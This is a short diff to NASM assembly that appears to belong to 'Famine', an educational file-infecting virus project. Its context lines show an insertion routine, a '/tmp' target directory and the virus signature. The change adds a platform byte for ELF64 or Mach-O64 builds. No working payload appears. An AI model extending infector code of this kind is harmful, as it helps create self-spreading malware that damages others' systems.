@@ -248,6 +248,12 @@ insert:                                                         ; expecting data
                 pop         r13
                 ret
 
+%ifidn __OUTPUT_FORMAT__, elf64
+    platform    db 0
+%elifidn __OUTPUT_FORMAT__, macho64
+    platform    db 1
+%endif
+
 slash_tmp   db "/tmp",0
 signature   db "famine v0.1 @42siliconvalley",0
 pie_address dq _start
